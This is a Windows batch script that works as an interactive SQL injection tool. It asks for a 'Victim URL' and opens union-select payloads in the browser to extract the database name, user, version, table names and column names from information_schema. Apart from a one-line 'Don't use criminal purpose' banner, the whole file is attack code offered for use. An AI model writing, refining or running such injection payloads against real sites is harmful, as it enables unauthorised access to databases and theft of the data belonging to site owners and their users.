@echo off
setlocal

echo -----------------------------------------------
echo -----------------------------------------------
echo -----------------------------------------------
echo -----------------------------------------------
echo ---------------(Open=Source)-------------------
echo -----------------------------------------------
echo ---------(Don't=use=criminal=purpose)----------
echo -----------------------------------------------
echo -----------------------------------------------

echo EX: "http://www.test.com/vuln.php?id=4"
set /p url=VIctim URL=

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:LOOP
set /p YN=You want to see DB name? (Y/N)

if /i "%YN%" == "y" goto YES
if /i "%YN%" == "n" goto NO

goto LOOP
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

:YES
echo YES : enter
start %url%+union+select+database()--

pause>nul

:NO
echo Got Damn !!!

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:LOOP
set /p YN=You want to see User name? (Y/N)

if /i "%YN%" == "y" goto YES
if /i "%YN%" == "n" goto NO

goto LOOP
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

:YES
echo YES : enter
start %url%+union+select+user()--

pause>nul

:NO
echo Got Damn !!!

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:LOOP
set /p YN=You want to see version name? (Y/N)

if /i "%YN%" == "y" goto YES
if /i "%YN%" == "n" goto NO

goto LOOP
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

:YES
echo YES : enter
start %url%+union+select+version()--

pause>nul

:NO
echo Got Damn !!!

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:LOOP
set /p YN=You want to see table list? (Y/N)

if /i "%YN%" == "y" goto YES
if /i "%YN%" == "n" goto NO

goto LOOP
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

:YES
echo YES : enter
start %url%+union+select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()--

pause>nul

:NO
echo Got Damn !!!

set /p table=table name=


::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:LOOP
set /p YN=You want to see columns? (Y/N)

if /i "%YN%" == "y" goto YES
if /i "%YN%" == "n" goto NO

goto LOOP
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

:YES
echo YES : enter
start %url%+union+select+group_concat(column_name)+from+information_schema.columns+where+table_name=%table%--

pause>nul

:NO
echo finish

pause>nul
